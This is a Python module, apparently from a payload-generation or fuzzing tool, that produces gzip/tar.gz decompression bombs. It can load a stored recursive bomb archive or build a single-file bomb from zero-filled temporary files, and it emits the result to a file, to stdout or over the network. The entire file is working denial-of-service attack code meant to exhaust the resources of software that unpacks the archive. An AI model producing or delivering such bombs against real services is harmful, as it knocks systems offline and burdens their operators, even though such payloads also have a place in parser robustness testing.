import os
import io
import tarfile
import logging
from options import Options


options = Options()
options.add_option('type', 'recursive', 'Type of bomb', ['single_file', 'layer', 'recursive'])
options.add_option('target_size', 100000,
                   'Desired size of decompressed file in bytes (not applicable to recursive bombs)')

# TODO - description of exploit


def run(generator, output):

    if output.OUTPUT_NAME not in ["file", "stdout", "network"]:
        raise ValueError("Unsupported output type for gz bomb.")

    if output.OUTPUT_NAME == "file" and output.options["format"] != "binary":
        raise ValueError("Only binary files are supported for output.")

    if options['type'] == 'recursive':
        with open(os.path.dirname(os.path.realpath(__file__)) + '/bombs-DONOTOPEN/tar_gz_recursive.tar.gz', 'rb') as f:
            contents = f.read()
        output.output([contents])

    elif options['type'] == 'single_file':
        tar_gz_contents = singlefilebomb(options['target_size'])
        output.output([tar_gz_contents])

    elif options['type'] == 'layer':
        logging.warning('Not yet implemented.')


def singlefilebomb(target_size):

    memfile = io.BytesIO()
    with tarfile.open(fileobj=memfile, mode="w|gz") as tar:
        if target_size > 1000:
            for i in range(target_size // 1000):
                maketempfile("file_"+str(i), 1000)
                tar.add("file_"+str(i))
                os.remove("file_"+str(i))
            maketempfile("overflow", target_size % 1000)
            tar.add("overflow")
            os.remove("overflow")
        else:
            maketempfile("yoloswag", target_size)
            tar.add("yoloswag")
            os.remove("yoloswag")
    return memfile.getvalue()


def maketempfile(fname, size):
    f = open(fname, "wb")
    f.write(b'0' * size)
    f.close()
